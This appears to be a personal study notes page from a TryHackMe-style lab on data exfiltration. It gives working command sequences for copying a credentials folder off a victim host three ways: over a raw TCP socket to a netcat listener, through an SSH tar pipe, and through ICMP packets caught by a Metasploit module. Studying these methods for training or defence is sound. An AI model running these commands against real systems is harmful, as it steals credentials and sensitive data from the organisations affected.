---
layout: notes
permalink: /notes/network/exfil/
title: Data Exfiltration Techniques
---

# Data Exfiltration Techniques
Data Exfiltration is the process of taking an unauthorized copy of sensitive data and moving it from the inside of an organization's network to the outside.

## Scenario:
```
JumpBox -> Victim1 (where files located) -> JumpBox
Filename on Victim1: /home/victim1/credentials/admin.txt
```
## via TCP Socket
![TCP](/assets/images/TCP.png)
```bash
#Prepare listener
thm@jump-box$ nc -lvp 8080 > /tmp/secrets.data

#Connect to Victim from JumpBox and find files to be exfiltrated
thm@jump-box$ ssh thm@victim1.thm.com
thm@victim1$ cat /home/victim1/credentials/admin.txt

#Exfiltrate data over TCP from victim machine,  make sure the listener is running on the JumpBox.
thm@victim1:$ tar zcf - /home/victim1/credentials/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080

#Confirm files transfered successfully
thm@jump-box$ ls -l /tmp/

#Restore the tar file
thm@jump-box$ cd /tmp/
thm@jump-box:/tmp/$ dd conv=ascii if=secrets.data |base64 -d > creds.tar
thm@jump-box:/tmp/$ tar xvf creds.tar
thm@jump-box:/tmp/$ cat credentials/admin.txt
```

## via SSH
![SSH](/assets/images/SSH.png)
```bash
#Check SSH service on JumpBox
thm@jump-box$ systemctl status ssh (enabled)

#Connect to Victim and send the files
thm@jump-box$ ssh thm@victim1.thm.com
thm@victim1:$ tar cf - /home/victim1/credentials/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"

#Confirm the files transfered successfully
thm@jump-box$ ls -l /tmp
```

## via ICMP
![ICMP](/assets/images/ICMP.png)
```bash
#Configure Metasploit
msfconsole -q
msf5 > use auxiliary/server/icmp_exfil
msf5 auxiliary(server/icmp_exfil) > set BPF_FILTER icmp and not src ATTACKBOX_IP
msf5 auxiliary(server/icmp_exfil) > set INTERFACE eth0
msf5 auxiliary(server/icmp_exfil) > run

#Send BOF trigger from the victim machine, to start Metasploit writing to the disk
thm@jump-box$ ssh thm@victim1.thm.com
sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "BOFfile.txt"

#Start sending data
sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin:password"
sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin2:password2"
sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "EOF"
```

## via Websites
[Checkout the LOTS Project](https://lots-project.com/)